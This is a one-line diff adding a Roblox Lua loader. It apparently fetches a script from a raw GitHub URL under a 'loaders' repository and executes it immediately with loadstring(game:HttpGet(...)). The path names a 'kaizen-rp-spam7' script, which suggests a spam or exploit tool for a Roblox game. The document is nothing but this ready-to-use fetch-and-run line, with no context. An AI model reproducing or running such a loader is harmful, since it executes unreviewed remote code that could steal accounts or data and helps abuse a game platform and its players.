@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandLobsterFill/loaders/main/loaders/kaizen-rp-spam7-ae4mas7gmfl7xh.lua"))()
